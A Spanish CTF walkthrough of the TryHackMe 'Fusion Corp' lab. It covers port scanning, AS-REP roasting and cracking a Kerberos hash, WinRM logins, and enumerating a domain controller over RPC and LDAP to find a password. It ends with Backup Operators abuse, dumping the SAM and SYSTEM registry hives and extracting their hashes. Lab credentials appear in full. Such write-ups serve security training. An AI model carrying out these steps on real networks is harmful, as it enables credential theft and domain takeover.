## TryHackMe  <> Fusion Corp

![image](https://github.com/Esevka/CTF/assets/139042999/f7bc6056-a728-4c36-a28e-2e1afd730143)

Enlace Maquina: https://tryhackme.com/room/fusioncorp

Enunciado : 

  - Segun el Enunciado se ha parcheado todo lo informado anteriormente y podemos volver a realizar las pruebas.
  - Conseguir 3 Flags
---
---

## Escaneo de puertos NMAP

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
    └─# nmap -p- -open -sS --min-rate 5000 -n -Pn -vvv 10.10.183.217 -oG open_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 08:16 CEST
    
    PORT      STATE SERVICE          REASON
    53/tcp    open  domain           syn-ack ttl 127
    80/tcp    open  http             syn-ack ttl 127
    88/tcp    open  kerberos-sec     syn-ack ttl 127
    135/tcp   open  msrpc            syn-ack ttl 127
    139/tcp   open  netbios-ssn      syn-ack ttl 127
    389/tcp   open  ldap             syn-ack ttl 127
    445/tcp   open  microsoft-ds     syn-ack ttl 127
    464/tcp   open  kpasswd5         syn-ack ttl 127
    593/tcp   open  http-rpc-epmap   syn-ack ttl 127
    636/tcp   open  ldapssl          syn-ack ttl 127
    3268/tcp  open  globalcatLDAP    syn-ack ttl 127
    3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
    3389/tcp  open  ms-wbt-server    syn-ack ttl 127
    5985/tcp  open  wsman            syn-ack ttl 127
    9389/tcp  open  adws             syn-ack ttl 127
    49666/tcp open  unknown          syn-ack ttl 127
    49668/tcp open  unknown          syn-ack ttl 127
    49669/tcp open  unknown          syn-ack ttl 127
    49670/tcp open  unknown          syn-ack ttl 127
    49673/tcp open  unknown          syn-ack ttl 127
    49689/tcp open  unknown          syn-ack ttl 127
    49700/tcp open  unknown          syn-ack ttl 127

-Captura exportado en formato grepable,por lo que vamos a extraer los puertos para lanzarles unos scripts basicos de reconocimiento.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
    └─# list_port open_ports 
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49668,49669,49670,49673,49689,49700

Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
    └─# nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49668,49669,49670,49673,49689,49700 -sCV -n -Pn 10.10.183.217 -oN info_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 08:18 CEST
    Nmap scan report for 10.10.183.217
    Host is up (0.063s latency).
    
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    
    80/tcp    open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: eBusiness Bootstrap Template
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 06:18:39Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
    | Not valid before: 2023-10-13T06:12:01
    |_Not valid after:  2024-04-13T06:12:01
    | rdp-ntlm-info: 
    |   Target_Name: FUSION
    |   NetBIOS_Domain_Name: FUSION
    |   NetBIOS_Computer_Name: FUSION-DC
    |   DNS_Domain_Name: fusion.corp
    |   DNS_Computer_Name: Fusion-DC.fusion.corp
    |   Product_Version: 10.0.17763
    |_  System_Time: 2023-10-14T06:19:29+00:00
    |_ssl-date: 2023-10-14T06:20:08+00:00; 0s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    49666/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49673/tcp open  msrpc         Microsoft Windows RPC
    49689/tcp open  msrpc         Microsoft Windows RPC
    49700/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

## Analizamos la informacion obtenida sobre los puertos

--Puerto 80 (HTTP)

  - Despues de analizar la web y ver su codigo no encontramos nada, vamos a ver si encontramos directorios con gobuster.
  
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
        └─# gobuster dir -u http://10.10.183.217 -w /usr/share/wordlists/dirb/common.txt 
        ===============================================================
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        
        /backup               (Status: 301) [Size: 151] [--> http://10.10.183.217/backup/]
        /css                  (Status: 301) [Size: 148] [--> http://10.10.183.217/css/]
        /img                  (Status: 301) [Size: 148] [--> http://10.10.183.217/img/]
        /index.html           (Status: 200) [Size: 53888]
        /js                   (Status: 301) [Size: 147] [--> http://10.10.183.217/js/]
        /lib                  (Status: 301) [Size: 148] [--> http://10.10.183.217/lib/]
  
    - El directorio backup salta a la vista que es el primero en revisar, nos descargamos employees.ods a nuestra maquina.
      
      ![image](https://github.com/Esevka/CTF/assets/139042999/adc5b939-c80a-4023-8c73-df142db019db)

      ![image](https://github.com/Esevka/CTF/assets/139042999/51ba66dd-6231-4d32-9faa-e87e0e851bc0)

    - Si volvemos atras en la web encontramos una serie de personajes los cuales aparecen en la lista, por lo que parece ser que tenemos nombres de usuarios de empleados de la empresa incluso sabemos el  cargo que ejercen dentro de ella.

      ![image](https://github.com/Esevka/CTF/assets/139042999/bcc7641c-5073-498d-a392-8416c5d5a5a2)

--Puerto 88 (KERBEROS)

  Info de gran ayuda: [+]https://www.tarlogic.com/es/blog/como-funciona-kerberos/ [+]https://www.tarlogic.com/es/blog/como-atacar-kerberos/

  - Tenemos un listado de usuarios,por lo que vamos a probar con un ataque a kerberos llamado ASREPRoast(se basa en encontrar usuarios que no requieren pre-autenticación de Kerberos)
  
    ![image](https://github.com/Esevka/CTF/assets/139042999/97787c44-b781-42b3-a475-78993c8bd668)

        Como Funciona la Preautenticacion
        La preautenticación demuestra que el usuario conoce su contraseña antes de recibir el ticket de autenticación.
        Timestamp en el ticket garantiza que el ticket sea válido solo durante un período de tiempo limitado y protege contra ataques de repetición. 
    
    Montamos todo:
    
    1)Creamos una lista con los usuarios que hemos encontrado.
    
    2)Editamos nuestro fichero /etc/hosts

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/FusionCorp/content]
        └─# cat /etc/hosts
        10.10.122.116   fusion.corp
        [IP Maquina]    [Dominio resolver]
    
    3)Montamos el comando y obtenemos Kerberos HASH (RC4) del usuario lparker.

      ![image](https://github.com/Esevka/CTF/assets/139042999/858ac63d-ad88-45ca-97ba-8c5c99ba2813)

    4)Intentamos crakear el hash del usuario lparker con john y asi obtener unas credenciales validad para intenter conectarnos por los demas servicios expuestos.

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/FusionCorp/content]
        └─# john hashuser_NP --wordlist=/usr/share/wordlists/rockyou.txt 
        Using default input encoding: UTF-8
        Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
        Will run 3 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        !!abbylvzsvs2k6! ($krb5asrep$lparker@FUSION.CORP)     
        1g 0:00:00:02 DONE (2023-10-14 09:50) 0.4032g/s 991896p/s 991896c/s 991896C/s !ebabaloh..๙า๘ฌน++๘
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed.

      Conseguimos credenciales     lparker:!!abbylvzsvs2k6!


## Autenticacion en la maquina victima

-Nos autenticamos con el usuario lparker en la maquina victima y obtenemos --> flag.txt(User1)

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
    └─# evil-winrm -i 10.10.169.83 -u lparker -p '!!abbylvzsvs2k6!'
    
    *Evil-WinRM* PS C:\Users\lparker\Documents> dir ..\Desktop
    
        Directory: C:\Users\lparker\Desktop
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----         3/3/2021   6:04 AM             37 flag.txt
    
    *Evil-WinRM* PS C:\Users\lparker\Documents> type ..\Desktop\flag.txt
    THM{c105b6fb249741b8-------ada8218f4ef}

-Despues de analizar la maquina y visualizar toda la info del usuario lparker,necesitamos escalar privilegios.

    *Evil-WinRM* PS C:\Users\lparker\Documents> whoami /all
    
    USER INFORMATION
    ----------------
    User Name      SID
    ============== =============================================
    fusion\lparker S-1-5-21-1898838421-3672757654-990739655-1103
    
    GROUP INFORMATION
    -----------------
    Group Name                                  Type             SID          Attributes
    =========================================== ================ ============ ==================================================
    Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

-Mostramos los usuario del sistema.

    *Evil-WinRM* PS C:\Users\lparker\Documents> net user
    
    User accounts for \\
    -------------------------------------------------------------------------------
    Administrator            Guest                    jmurphy
    krbtgt                   lparker
    The command completed with one or more errors.

  

## Escalada de privilegios 

#### Usuario lparker --> jmurphy

-Este proceso de obtencion de credenciales para el usuario jmurphy se puede hacer mediante el servicio 389(ldap) o  135(msrpc) 

1) MSRPC

       INFO:
         MSRPC son las siglas de "Microsoft Remote Procedure Call" (Llamada a Procedimiento Remoto de Microsoft).
   
         Permite que los programas en una computadora hagan llamadas a procedimientos ubicados en otras computadoras,
         como si estuvieran llamando a funciones o métodos locales.
   
   INFO: rpcclient enumeration [+] https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-smb/rpcclient-enumeration

   -Enumeramos usuario del sistema y obtenemos informacion del usuario jmurphy.
   
        ┌┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
        └─# rpcclient fusion.corp -U "fusion.corp/lparker" --password='!!abbylvzsvs2k6!'       
        rpcclient $> enumdomusers
        user:[Administrator] rid:[0x1f4]
        user:[Guest] rid:[0x1f5]
        user:[krbtgt] rid:[0x1f6]
        user:[lparker] rid:[0x44f]
        user:[jmurphy] rid:[0x450]
        rpcclient $> queryuser 0x450
                User Name   :   jmurphy
                Full Name   :   Joseph Murphy
                Home Drive  :
                Dir Drive   :
                Profile Path:
                Logon Script:
                Description :   Password set to u8WC3!kLsgw=#bRY
                Workstations:
                Comment     :
       [...]

    Encontamos credenciales del usuario jmurphy:u8WC3!kLsgw=#bRY

2) LDAP
   
       INFO:
         LDAP (Protocolo Ligero de Acceso a Directorios, por sus siglas en inglés) es un protocolo estándar de acceso
         y mantenimiento de servicios de directorio. Un servicio de directorio es una base de datos que almacena información
         de manera jerárquica y se utiliza para gestionar información de recursos compartidos, como usuarios, grupos,
         impresoras, servidores y otros objetos de red en una organización. LDAP se utiliza comúnmente para buscar, recuperar,
         modificar y autenticar información en un directorio.
         LDAP se utiliza en una amplia variedad de aplicaciones y servicios, como servidores de directorio Microsoft Active Directory.
   
   INFO: [+] https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-ldap
   
   -Obtenemos toda la informacion sobre el administrador de dominio

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
        └─# ldapdomaindump fusion.corp -u 'fusion.corp\lparker' -p '!!abbylvzsvs2k6!' --no-json --no-grep -o ldap/
        [*] Connecting to host...
        [*] Binding to host
        [+] Bind OK
        [*] Starting domain dump
        [+] Domain dump finished

     ![image](https://github.com/Esevka/CTF/assets/139042999/276e0f32-9a08-4f06-a27f-0fb60852a9f7)

     Obtenemos informacion muy importante del sistema.

     ![image](https://github.com/Esevka/CTF/assets/139042999/58e292b7-100c-4988-aeba-cd458fedd304)

     ![image](https://github.com/Esevka/CTF/assets/139042999/31c0481e-5743-4387-8ab1-70ba5712ac12)

     ![image](https://github.com/Esevka/CTF/assets/139042999/70999a07-c012-4308-9bcd-d3f3805325f1)


     - Encontamos credenciales del usuario jmurphy:u8WC3!kLsgw=#bRY
     - Vemos que tanto el usuario lparker como jmurphy pertenecen al grupo --> Remote Management Users
     - Vemos que el usuario jmurphy pertenece al grupo --> Backup Operators (importante este detalle)


#### Usuario jmurphy --> Administrator

-Obtenemos flag User2 y acceso a la maquina con el usuario jmurphy 

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
    └─# evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'
                                            
    Evil-WinRM shell v3.5                                    
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                          
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\jmurphy\Documents> type ..\Desktop\flag.txt
    THM{b4aee2db29--------------42e047612e}

-Listamos todo del usuario jmurphy y verificamos que pertenece al grupo Backup Operators con  permisos SeBackupPrivilege y SeRestorePrivilege.

    *Evil-WinRM* PS C:\Users\jmurphy\Documents> whoami /all
    
    USER INFORMATION
    ----------------
    User Name      SID
    ============== =============================================
    fusion\jmurphy S-1-5-21-1898838421-3672757654-990739655-1104
    
    GROUP INFORMATION
    -----------------
    Group Name                                 Type             SID          Attributes
    ========================================== ================ ============ ==================================================
    Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
    BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
    Mandatory Label\High Mandatory Level       Label            S-1-16-12288
    
    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeBackupPrivilege             Back up files and directories  Enabled
    SeRestorePrivilege            Restore files and directories  Enabled
    SeShutdownPrivilege           Shut down the system           Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

-Elevamos privilegios.

  - INTENTAMOS, Obtenemos una copia de SAM y SYSTEM del registro de windows donde obtenemos hashes de usuario para posteriormente intentamos crakearlo (NO FUNCIONA)
         Dumpeamos SAM Y SYSTEM del registro de windows.
     
           reg save hklm\system system
           reg save hklm\sam sam


         Extraemos los hash del fichero SAM

           ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
          └─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
          Impacket v0.11.0 - Copyright 2023 Fortra
          
          [*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
          [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
          [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
          [*] Cleaning up... 


  - Buscando informacion por internet encontre informacion sobre un fichero llamado NTDS.dit

         INFO:
           El archivo "C:\Windows\NTDS\ntds.dit" (Base de datos de Active Directory)
           es un componente crítico de la base de datos de Microsoft Windows Active Directory.
           Active Directory es un servicio de directorio utilizado por servidores Windows para almacenar
           información sobre objetos en una red, como cuentas de usuario, cuentas de computadoras y pertenencias a grupos.
    
    -Abusando de la base de datos de Active Directory NTDS.dit
     


  
     



  
        
        
              
    
    


